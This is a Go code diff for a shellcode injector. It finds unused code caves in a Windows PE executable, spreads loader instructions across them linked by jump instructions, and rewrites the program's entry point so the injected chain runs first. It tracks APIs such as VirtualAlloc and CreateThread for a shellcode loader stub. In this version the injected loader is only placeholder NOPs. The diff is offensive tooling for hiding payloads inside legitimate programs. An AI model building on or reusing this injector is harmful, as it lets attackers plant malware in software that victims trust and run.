@@ -19,7 +19,7 @@ type Injector struct {
 	seed int64
 	rand *rand.Rand
 
-	// assembler
+	// assembler engine
 	engine *keystone.Engine
 
 	// context arguments
@@ -27,6 +27,16 @@ type Injector struct {
 	img  *pe.File
 	dup  []byte
 	arch string
+	vm   []byte
+	iat  []*iat
+
+	// for replace stub in loader
+	procCreateThread   *iat
+	procVirtualAlloc   *iat
+	procVirtualProtect *iat
+	procLoadLibraryA   *iat
+	procLoadLibraryW   *iat
+	procGetProcAddress *iat
 
 	// for write shellcode loader
 	caves []*codeCave
@@ -90,10 +100,7 @@ func (inj *Injector) Inject(shellcode, image []byte, opts *Options) ([]byte, err
 	}
 	inj.img = peFile
 	inj.arch = arch
-	// make duplicate about pe image
-	dup := make([]byte, len(image))
-	copy(dup, image)
-	inj.dup = dup
+	inj.loadImage(image)
 	// scan code cave in image text section
 	err = inj.scanCodeCave()
 	if err != nil {
@@ -121,14 +128,26 @@ func (inj *Injector) Inject(shellcode, image []byte, opts *Options) ([]byte, err
 	if err != nil {
 		return nil, fmt.Errorf("failed to build loader: %s", err)
 	}
-
 	fmt.Println(len(loader))
-
+	// make duplicate for make output image
+	dup := make([]byte, len(image))
+	copy(dup, image)
+	inj.dup = dup
+	// inject loader segment
+	sc := [][]byte{
+		{0x90},
+		{0x66, 0x90},
+	}
+	err = inj.inject(sc)
+	if err != nil {
+		return nil, fmt.Errorf("failed to inject loader: %s", err)
+	}
+	output := inj.dup
 	// clean context data
 	inj.img = nil
 	inj.dup = nil
 	inj.caves = nil
-	return nil, nil
+	return output, nil
 }
 
 func (inj *Injector) initAssembler() error {
@@ -150,6 +169,82 @@ func (inj *Injector) assemble(src string) ([]byte, error) {
 		return nil, errors.New("invalid register in assembly source")
 	}
 	return inj.engine.Assemble(src, 0)
+}
+
+func (inj *Injector) inject(loader [][]byte) error {
+	if len(loader) < 2 {
+		return errors.New("loader must contain at least two instructions")
+	}
+	if len(loader) > len(inj.caves) {
+		return errors.New("not enough caves to inject loader")
+	}
+	var (
+		entryPoint  uint32
+		maxInstSize int
+	)
+	switch inj.arch {
+	case "386":
+		entryPoint = inj.img.OptionalHeader.(*pe.OptionalHeader32).AddressOfEntryPoint
+		maxInstSize = maxInstSizeX86
+	case "amd64":
+		entryPoint = inj.img.OptionalHeader.(*pe.OptionalHeader64).AddressOfEntryPoint
+		maxInstSize = maxInstSizeX64
+	}
+	// search a cave near the entry point
+	var first *codeCave
+	for i, cave := range inj.caves {
+		offset := int64(cave.virtualAddr) - int64(entryPoint)
+		if offset <= 4096 && offset >= -4096 {
+			first = cave
+			inj.removeCodeCave(i)
+			break
+		}
+	}
+	// if failed to search target, random select a cave
+	if first == nil {
+		i := inj.rand.Intn(len(inj.caves))
+		first = inj.caves[i]
+		inj.removeCodeCave(i)
+	}
+	target := first
+	next := inj.selectCodeCave()
+	for i := 0; i < len(loader); i++ {
+		size := len(loader[i])
+		if size > maxInstSize {
+			return errors.New("appear too large instruction in loader")
+		}
+		var rel int64
+		if i != len(loader)-1 {
+			rel = int64(next.virtualAddr) - int64(target.virtualAddr+uint32(size)) - 5
+		} else {
+			rel = int64(entryPoint) - int64(target.virtualAddr+uint32(size)) - 5
+		}
+		jmp := make([]byte, 5)
+		jmp[0] = 0xE9
+		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
+		inst := append([]byte{}, loader[i]...)
+		inst = append(inst, jmp...)
+		copy(inj.dup[target.pointerToRaw:], inst)
+		// update status
+		target = next
+		next = inj.selectCodeCave()
+	}
+	// overwrite original entry point
+	peOffset := binary.LittleEndian.Uint32(inj.dup[64-4:])
+	hdrOffset := peOffset + 4 + 20
+	binary.LittleEndian.PutUint32(inj.dup[hdrOffset+16:], first.virtualAddr)
+	return nil
+}
+
+func (inj *Injector) selectCodeCave() *codeCave {
+	i := inj.rand.Intn(len(inj.caves))
+	cave := inj.caves[i]
+	inj.removeCodeCave(i)
+	return cave
+}
+
+func (inj *Injector) removeCodeCave(i int) {
+	inj.caves = append(inj.caves[:i], inj.caves[i+1:]...)
 }
 
 // Seed is used to get the random seed for debug.
